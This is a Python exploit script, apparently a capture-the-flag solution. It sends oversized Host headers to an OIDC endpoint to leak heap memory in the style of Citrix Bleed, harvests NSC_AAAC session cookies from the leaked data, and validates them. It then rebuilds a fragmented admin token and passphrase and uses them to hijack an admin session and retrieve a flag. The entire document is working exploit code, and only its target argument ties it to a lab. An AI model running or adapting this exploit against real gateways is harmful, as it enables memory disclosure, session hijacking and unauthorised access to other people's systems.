#!/usr/bin/env python3
import re
import sys
import urllib.error
import urllib.request


TARGET = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8080"
OIDC = "/oauth/idp/.well-known/openid-configuration"
USERNAME = "/logon/LogonPoint/Authentication/GetUserName"
FLAG_PATH = "/cvpn/http/sesame-admin.local/open-sesame"


def request(path, method="GET", headers=None):
    req = urllib.request.Request(TARGET + path, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()


def leak(host_len):
    status, body = request(OIDC, headers={"Host": "a" * host_len})
    if status != 200:
        return b""
    marker = b"\x00" * 16
    if marker not in body:
        return b""
    return body.split(marker, 1)[1]


def test_cookie(token):
    status, body = request(USERNAME, method="POST", headers={"Cookie": f"NSC_AAAC={token}"})
    return status == 200, body.decode(errors="replace")


def collect_heap():
    collected = bytearray()
    seen = set()
    for host_len in range(24576, 65000, 2048):
        blob = leak(host_len)
        if not blob:
            continue
        if blob in seen:
            continue
        seen.add(blob)
        collected.extend(blob + b"\n")
        print(f"[+] host_len={host_len} leaked={len(blob)} total={len(collected)}")
    return bytes(collected)


def rebuild(pattern, expected_count):
    parts = {}
    for idx, total, value in pattern:
        idx = int(idx)
        total = int(total)
        if total == expected_count:
            parts[idx] = value.decode()
    if sorted(parts) != list(range(expected_count)):
        raise SystemExit(f"missing fragments for {expected_count}-part secret: {sorted(parts)}")
    return "".join(parts[i] for i in range(expected_count))


def main():
    heap = collect_heap()

    shallow_tokens = sorted(set(re.findall(rb"NSC_AAAC=([a-f0-9]{65})", heap)))
    for token in shallow_tokens:
        ok, username = test_cookie(token.decode())
        if ok:
            print(f"[+] valid shallow cookie {token.decode()} -> {username!r}")

    admin = rebuild(
        re.findall(rb"aaa\.admin\.token\.fragment\[(\d+)/(\d+)\]=([a-f0-9]+)", heap),
        7,
    )
    phrase = rebuild(
        re.findall(rb"door\.phrase\.fragment\[(\d+)/(\d+)\]=([A-Za-z0-9_-]+)", heap),
        3,
    )

    ok, username = test_cookie(admin)
    print(f"[+] rebuilt admin cookie -> {username!r}")
    if not ok:
        raise SystemExit("admin cookie rejected")

    status, body = request(
        FLAG_PATH,
        headers={"Cookie": f"NSC_AAAC={admin}", "X-Open-Sesame": phrase},
    )
    print(body.decode(errors="replace").strip())
    if status != 200:
        raise SystemExit(f"flag request failed with HTTP {status}")


if __name__ == "__main__":
    main()
